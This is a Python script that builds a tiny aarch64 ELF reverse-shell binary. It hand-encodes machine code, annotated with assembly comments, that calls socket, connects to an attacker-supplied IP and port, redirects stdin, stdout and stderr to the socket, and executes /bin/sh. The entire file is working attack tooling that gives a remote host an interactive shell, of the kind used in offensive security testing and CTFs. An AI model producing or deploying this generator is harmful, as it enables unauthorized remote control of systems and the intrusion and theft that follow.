import struct
import sys
import hashlib
import socket
# Generates a 208 byte reverse shell for aarch64
if len(sys.argv) != 3:
    print("Usage: python3 aarch64_rshell.py IP PORT")
    sys.exit(1)

RIP = sys.argv[1]
RPORT = int(sys.argv[2])

def writeBin(b,h):
    outfile = h + ".bin"
    f = open(outfile,'wb')
    f.write(b)
    f.close()
    print(outfile)

def ip2long(inIP):
    return struct.unpack("!L", socket.inet_aton(inIP))[0]

def encodeIpAndPort(ip,port):
    config_out = b""
    port_template = 0xf2a00001 # this is the template for the instruction movk x1, imm16, lsl #16
    port_number = int.from_bytes(struct.pack('>h', port),"little")
    port_out = port_template | ( port_number << 5 )
    config_out += port_out.to_bytes(4,"little")

    ipInt = ip2long(ip)
    
    ip1_template = 0xf2c00001 # this is the template for the instruction movk x1, imm16, lsl #32
    ip1 = ipInt & 0xFFFF0000
    ip1 = ip1 >> 16
    ip1_number = int.from_bytes(struct.pack('>h', ip1),"little")
    ip1_out = ip1_template | ( ip1_number << 5 )
    config_out += ip1_out.to_bytes(4,"little")
    
    ip2_template = 0xf2e00001 # this is the template for the instruction movk x1, imm16, lsl #48
    ip2 = ipInt & 0x0000FFFF
    ip2_number = int.from_bytes(struct.pack('>h', ip2),"little")
    ip2_out = ip2_template | ( ip2_number << 5 )
    config_out += ip2_out.to_bytes(4,"little")
    
    return config_out

b =  b""
b += b"\x7f\x45\x4c\x46" # 00000000 ╭──────────╮
b += b"\xc8\x18\x80\xd2" # 00000004 │ d28018c8 │  mov x8, #0xc6               // socket syscall
b += b"\x02\x00\x80\xd2" # 00000008 │ d2800002 │  mov x2, #0x0                // IPPROTO_IP
b += b"\x02\x00\x00\x14" # 0000000C │ 14000002 │  branch to 0x14
b += b"\x02\x00\xb7\x00" # 00000010 │          │
b += b"\x21\x00\x80\xd2" # 00000014 │ d2800021 │  mov x1, #0x1                // SOCK_STREAM
b += b"\x04\x00\x00\x14" # 00000018 │ 14000004 │  branch to 0x28 // This is also the elf entrypoint
b += b"\x00\x00\x00\x00" # 0000001C │          │
b += b"\x40\x00\x00\x00" # 00000020 │          │
b += b"\x00\x00\x00\x00" # 00000024 │          │
b += b"\x40\x00\x80\xd2" # 00000028 │ d2800040 │  mov x0, #0x2                // AF_INET
b += b"\x01\x00\x00\xd4" # 0000002C │ d4000001 │  svc #0x0                    // call system
b += b"\x0a\x00\x00\x14" # 00000030 │ 1400000a │  branch to 0x78
b += b"\x40\x00\x38\x00" # 00000034 │          │
b += b"\x01\x00\x00\x00" # 00000038 │          │
b += b"\x00\x00\x00\x00" # 0000003C │          │
b += b"\x01\x00\x00\x00" # 00000040 │          │
b += b"\x05\x00\x00\x00" # 00000044 │          │
b += b"\x00\x00\x00\x00" # 00000048 │          │
b += b"\x00\x00\x00\x00" # 0000004C │          │
b += b"\x00\x00\x00\x14" # 00000050 │          │
b += b"\x00\x00\x00\x00" # 00000054 │          │
b += b"\xe3\x03\x00\x2a" # 00000058 │ 2a0003e3 │  mov w3, w0                  // socket fd
b += b"\x05\x00\x00\x14" # 0000005C │ 14000005 │  branch to 0x70
b += b"\x00\x10\x00\x00" # 00000060 │          │
b += b"\x00\x00\x00\x00" # 00000064 │          │
b += b"\x00\x10\x00\x00" # 00000068 │          │
b += b"\x00\x00\x00\x00" # 0000006C │          │
b += b"\x68\x19\x80\xd2" # 00000070 │ d2801968 │  mov x8, #0xcb               // connect syscall
b += b"\x02\x02\x80\xd2" # 00000074 │ d2800202 │  mov x2, #0x10               // x2 = sizeof(sa)
b += b"\x41\x00\x80\xd2" # 00000078 │ d2800041 │  mov x1, #0x2                // x1 = &sa
b += encodeIpAndPort(RIP,RPORT) #   │          │ ; The IP/PORT is encoded and inserted here
b += b"\xe1\x0f\x1f\xf8" # 00000088 │ f81f0fe1 │  str   x1, [sp, #-16]!       // put it on the stack
b += b"\xe1\x03\x00\x91" # 0000008c │ 910003e1 │  mov   x1, sp                // x1 = &sa
b += b"\x01\x00\x00\xd4" # 00000090 │ d4000001 │  svc   #0x0                  // call system
b += b"\x08\x03\x80\xd2" # 00000094 │ d2800308 │  mov   x8, #0x18             // dup3 syscall
b += b"\x61\x00\x80\xd2" # 00000098 │ d2800061 │  mov   x1, #0x3              // stderr
                         #          │          │ dup3_loop:
b += b"\xe2\x03\x1f\xaa" # 0000009c │ aa1f03e2 │   mov   x2, xzr
b += b"\xe0\x03\x03\x2a" # 000000a0 │ 2a0303e0 │   mov   w0, w3
b += b"\x21\x04\x00\xf1" # 000000a4 │ f1000421 │   subs  x1, x1, #0x1
b += b"\x01\x00\x00\xd4" # 000000a8 │ d4000001 │   svc   #0x0
b += b"\x81\xff\xff\x54" # 000000ac │ 54ffff81 │   b.ne  0x9c <dup3_loop>    // Copy all the fdz
                         #          │          │ exec_shell:
b += b"\xa8\x1b\x80\xd2" # 000000b0 │ d2801ba8 │   mov   x8, #0xdd             // execve syscall
b += b"\xe0\x45\x8c\xd2" # 000000b4 │ d28c45e0 │   mov   x0, #0x622f           // "/b"
b += b"\x20\xcd\xad\xf2" # 000000b8 │ f2adcd20 │   movk  x0, #0x6e69, lsl #16  // "in"
b += b"\xe0\x65\xce\xf2" # 000000bc │ f2ce65e0 │   movk  x0, #0x732f, lsl #32  // "/s"
b += b"\x00\x0d\xe0\xf2" # 000000c0 │ f2e00d00 │   movk  x0, #0x68,   lsl #48  // "h"
b += b"\xe0\x03\x00\xf9" # 000000c4 │ f90003e0 │   str   x0, [sp]              // put it on the stack
b += b"\xe0\x03\x00\x91" # 000000c8 │ 910003e0 │   mov   x0, sp                // pointer in x0
b += b"\x01\x00\x00\xd4" # 000000cc │ d4000001 │   svc   #0x0                  // call system

m = hashlib.sha256()
m.update(b)
shorthash = m.digest().hex()[0:8] # This is here just to help distinguish different files
writeBin(b,shorthash) 
